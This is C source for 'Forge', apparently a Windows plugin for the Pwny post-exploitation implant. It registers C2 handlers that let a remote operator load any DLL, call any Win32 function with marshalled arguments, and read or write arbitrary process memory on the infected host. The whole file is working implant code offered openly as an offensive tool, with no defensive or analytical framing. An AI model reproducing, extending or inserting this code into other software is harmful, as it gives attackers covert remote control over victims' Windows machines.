/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Forge — arbitrary Win32 API call dispatcher.
 *
 * The Python side packs a DLL name, function name, and a typed argument
 * array.  This plugin resolves the function at runtime, marshals the
 * arguments, invokes the function through a generic x64 thunk, captures
 * the return value + GetLastError(), and ships any output buffers back.
 *
 * Wire protocol for the packed argument blob (little-endian):
 *
 *   For each argument:
 *     uint8_t  type       ARG_DWORD..ARG_BUF_INOUT (see below)
 *     uint32_t data_len   length of the following data field
 *     uint8_t  data[]     type-specific payload
 *
 * Wire protocol for packed output blob (returned in response):
 *
 *   For each output buffer (ARG_BUF_OUT / ARG_BUF_INOUT), in arg order:
 *     uint32_t arg_index
 *     uint32_t length
 *     uint8_t  data[]
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Constants                                                           */
/* ------------------------------------------------------------------ */


#define FORGE_CALL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define FORGE_MEMREAD \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define FORGE_MEMWRITE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 2)

#define FORGE_RESOLVE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 3)

/* TLV types — string family */
#define TLV_TYPE_FORGE_DLL \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_FORGE_FUNC \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)

/* TLV types — bytes family */
#define TLV_TYPE_FORGE_ARGS \
        TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)
#define TLV_TYPE_FORGE_RETVAL \
        TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_FORGE_OUTPUT \
        TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 2)

/* TLV types — int family */
#define TLV_TYPE_FORGE_LASTERR \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
#define TLV_TYPE_FORGE_ADDR \
        TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 3)
#define TLV_TYPE_FORGE_LENGTH \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_FORGE_DATA \
        TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE + 4)

/* Argument type tags (must match Python side) */
#define ARG_DWORD      0
#define ARG_QWORD      1
#define ARG_BOOL       2
#define ARG_LPCSTR     3
#define ARG_LPCWSTR    4
#define ARG_BUF_IN     5
#define ARG_BUF_OUT    6
#define ARG_BUF_INOUT  7
#define ARG_PTR        8

#define MAX_FORGE_ARGS 16

/* ------------------------------------------------------------------ */
/* Win32 typedefs                                                      */
/* ------------------------------------------------------------------ */

typedef DWORD   (WINAPI *fn_GetLastError)(void);
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);

static struct
{
    fn_GetLastError   pGetLastError;
    fn_LoadLibraryA   pLoadLibraryA;
    fn_GetProcAddress pGetProcAddress;
} w;

/* ------------------------------------------------------------------ */
/* Generic 16-arg call thunk (x64 Windows ABI)                         */
/* ------------------------------------------------------------------ */

typedef ULONG_PTR (*fn_generic_t)(
    ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
    ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
    ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
    ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);

/* ------------------------------------------------------------------ */
/* Per-argument descriptor                                             */
/* ------------------------------------------------------------------ */

typedef struct
{
    int type;
    void *alloc;        /* non-NULL if we malloc'd for this arg */
    size_t alloc_size;
    int is_output;      /* 1 → return buffer contents in response */
} forge_arg_t;

/* ------------------------------------------------------------------ */
/* forge_call handler                                                */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *forge_call(c2_t *c2)
{
    char dll_name[256];
    char func_name[256];
    unsigned char *args_buf;
    ssize_t args_len;

    HMODULE hMod;
    FARPROC pFunc;

    forge_arg_t args[MAX_FORGE_ARGS];
    ULONG_PTR values[MAX_FORGE_ARGS];
    int argc;
    int i;

    ULONG_PTR retval;
    DWORD last_error;

    tlv_pkt_t *result;

    /* ---- Parse request ---- */

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_FORGE_DLL, dll_name) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_FORGE_FUNC, func_name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    /* Resolve target function */
    hMod = w.pLoadLibraryA(dll_name);
    if (hMod == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pFunc = w.pGetProcAddress(hMod, func_name);
    if (pFunc == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* ---- Unpack arguments ---- */

    memset(args, 0, sizeof(args));
    memset(values, 0, sizeof(values));
    argc = 0;
    args_buf = NULL;

    args_len = tlv_pkt_get_bytes(c2->request, TLV_TYPE_FORGE_ARGS, &args_buf);

    if (args_len > 0 && args_buf != NULL)
    {
        size_t offset = 0;

        while (offset < (size_t)args_len && argc < MAX_FORGE_ARGS)
        {
            unsigned char arg_type;
            unsigned int data_len;

            /* Need at least 1 (type) + 4 (length) bytes */
            if (offset + 5 > (size_t)args_len)
                break;

            arg_type = args_buf[offset];
            offset += 1;

            memcpy(&data_len, args_buf + offset, 4);
            offset += 4;

            if (offset + data_len > (size_t)args_len)
                break;

            args[argc].type = arg_type;

            switch (arg_type)
            {
                case ARG_DWORD:
                case ARG_BOOL:
                {
                    DWORD val = 0;
                    if (data_len >= 4)
                        memcpy(&val, args_buf + offset, 4);
                    values[argc] = (ULONG_PTR)val;
                    break;
                }

                case ARG_QWORD:
                {
                    ULONG_PTR val = 0;
                    if (data_len >= 8)
                        memcpy(&val, args_buf + offset, 8);
                    values[argc] = val;
                    break;
                }

                case ARG_LPCSTR:
                {
                    char *str = (char *)malloc(data_len + 1);
                    if (str)
                    {
                        memcpy(str, args_buf + offset, data_len);
                        str[data_len] = '\0';
                    }
                    args[argc].alloc = str;
                    args[argc].alloc_size = data_len + 1;
                    values[argc] = (ULONG_PTR)str;
                    break;
                }

                case ARG_LPCWSTR:
                {
                    void *wstr = malloc(data_len + 2);
                    if (wstr)
                    {
                        memcpy(wstr, args_buf + offset, data_len);
                        ((char *)wstr)[data_len] = '\0';
                        ((char *)wstr)[data_len + 1] = '\0';
                    }
                    args[argc].alloc = wstr;
                    args[argc].alloc_size = data_len + 2;
                    values[argc] = (ULONG_PTR)wstr;
                    break;
                }

                case ARG_BUF_IN:
                {
                    void *buf = malloc(data_len);
                    if (buf)
                        memcpy(buf, args_buf + offset, data_len);
                    args[argc].alloc = buf;
                    args[argc].alloc_size = data_len;
                    values[argc] = (ULONG_PTR)buf;
                    break;
                }

                case ARG_BUF_OUT:
                {
                    void *buf = calloc(1, data_len);
                    args[argc].alloc = buf;
                    args[argc].alloc_size = data_len;
                    args[argc].is_output = 1;
                    values[argc] = (ULONG_PTR)buf;
                    break;
                }

                case ARG_BUF_INOUT:
                {
                    void *buf = malloc(data_len);
                    if (buf)
                        memcpy(buf, args_buf + offset, data_len);
                    args[argc].alloc = buf;
                    args[argc].alloc_size = data_len;
                    args[argc].is_output = 1;
                    values[argc] = (ULONG_PTR)buf;
                    break;
                }

                case ARG_PTR:
                {
                    ULONG_PTR val = 0;
                    if (data_len >= 8)
                        memcpy(&val, args_buf + offset, 8);
                    else if (data_len >= 4)
                    {
                        DWORD tmp = 0;
                        memcpy(&tmp, args_buf + offset, 4);
                        val = (ULONG_PTR)tmp;
                    }
                    values[argc] = val;
                    break;
                }

                default:
                    values[argc] = 0;
                    break;
            }

            offset += data_len;
            argc++;
        }
    }

    /* ---- Invoke ---- */

    retval = ((fn_generic_t)pFunc)(
        values[0],  values[1],  values[2],  values[3],
        values[4],  values[5],  values[6],  values[7],
        values[8],  values[9],  values[10], values[11],
        values[12], values[13], values[14], values[15]);

    last_error = w.pGetLastError();

    /* ---- Build response ---- */

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    /* 8-byte LE return value */
    {
        unsigned char retval_bytes[8];
        memcpy(retval_bytes, &retval, 8);
        tlv_pkt_add_bytes(result, TLV_TYPE_FORGE_RETVAL,
                          retval_bytes, 8);
    }

    tlv_pkt_add_u32(result, TLV_TYPE_FORGE_LASTERR, (int)last_error);

    /* Collect output buffers */
    {
        size_t out_total = 0;

        for (i = 0; i < argc; i++)
        {
            if (args[i].is_output && args[i].alloc)
                out_total += 4 + 4 + args[i].alloc_size;
        }

        if (out_total > 0)
        {
            unsigned char *out_buf = (unsigned char *)malloc(out_total);

            if (out_buf)
            {
                size_t off = 0;

                for (i = 0; i < argc; i++)
                {
                    if (args[i].is_output && args[i].alloc)
                    {
                        unsigned int idx = (unsigned int)i;
                        unsigned int len = (unsigned int)args[i].alloc_size;

                        memcpy(out_buf + off, &idx, 4); off += 4;
                        memcpy(out_buf + off, &len, 4); off += 4;
                        memcpy(out_buf + off, args[i].alloc, len);
                        off += len;
                    }
                }

                tlv_pkt_add_bytes(result, TLV_TYPE_FORGE_OUTPUT,
                                  out_buf, out_total);
                free(out_buf);
            }
        }
    }

    /* ---- Cleanup ---- */

    for (i = 0; i < argc; i++)
    {
        if (args[i].alloc)
            free(args[i].alloc);
    }

    if (args_buf)
        free(args_buf);

    return result;
}

/* ------------------------------------------------------------------ */
/* memread — read N bytes from an arbitrary address                    */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *forge_memread(c2_t *c2)
{
    unsigned char *addr_buf;
    ssize_t addr_len;
    int length;
    ULONG_PTR addr;
    tlv_pkt_t *result;

    addr_buf = NULL;
    addr_len = tlv_pkt_get_bytes(c2->request, TLV_TYPE_FORGE_ADDR, &addr_buf);
    if (addr_len < 8 || addr_buf == NULL)
    {
        if (addr_buf) free(addr_buf);
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    memcpy(&addr, addr_buf, 8);
    free(addr_buf);

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_FORGE_LENGTH, &length) < 0 ||
        length <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_bytes(result, TLV_TYPE_FORGE_DATA,
                      (unsigned char *)addr, (size_t)length);

    return result;
}

/* ------------------------------------------------------------------ */
/* memwrite — write bytes to an arbitrary address                      */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *forge_memwrite(c2_t *c2)
{
    unsigned char *addr_buf;
    ssize_t addr_len;
    unsigned char *data;
    ssize_t data_len;
    ULONG_PTR addr;

    addr_buf = NULL;
    addr_len = tlv_pkt_get_bytes(c2->request, TLV_TYPE_FORGE_ADDR, &addr_buf);
    if (addr_len < 8 || addr_buf == NULL)
    {
        if (addr_buf) free(addr_buf);
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    memcpy(&addr, addr_buf, 8);
    free(addr_buf);

    data = NULL;
    data_len = tlv_pkt_get_bytes(c2->request, TLV_TYPE_FORGE_DATA, &data);
    if (data_len <= 0 || data == NULL)
    {
        if (data) free(data);
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    memcpy((void *)addr, data, (size_t)data_len);
    free(data);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* forge_resolve — resolve DLL!Func to address without calling          */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *forge_resolve(c2_t *c2)
{
    char dll_name[256];
    char func_name[256];
    HMODULE hMod;
    FARPROC pFunc;
    tlv_pkt_t *result;
    unsigned char addr_bytes[8];
    ULONG_PTR addr;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_FORGE_DLL, dll_name) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_FORGE_FUNC, func_name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    hMod = w.pLoadLibraryA(dll_name);
    if (hMod == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pFunc = w.pGetProcAddress(hMod, func_name);
    if (pFunc == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    addr = (ULONG_PTR)pFunc;
    memcpy(addr_bytes, &addr, 8);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_bytes(result, TLV_TYPE_FORGE_ADDR, addr_bytes, 8);

    return result;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    w.pGetLastError   = (fn_GetLastError)cot_resolve("kernel32.dll",
                                                      "GetLastError");
    w.pLoadLibraryA   = (fn_LoadLibraryA)cot_resolve("kernel32.dll",
                                                      "LoadLibraryA");
    w.pGetProcAddress = (fn_GetProcAddress)cot_resolve("kernel32.dll",
                                                        "GetProcAddress");

    api_call_register(api_calls, FORGE_CALL,     (api_t)forge_call);
    api_call_register(api_calls, FORGE_MEMREAD,  (api_t)forge_memread);
    api_call_register(api_calls, FORGE_MEMWRITE, (api_t)forge_memwrite);
    api_call_register(api_calls, FORGE_RESOLVE,  (api_t)forge_resolve);
}

#else /* POSIX */

/*
 * Forge is a Windows-only concept (arbitrary Win32 API calls).
 * On POSIX this plugin is a no-op stub.
 */

#include <pwny/api.h>
#include <pwny/tab.h>

void register_tab_api_calls(api_calls_t **api_calls)
{
    (void)api_calls;
}

#endif
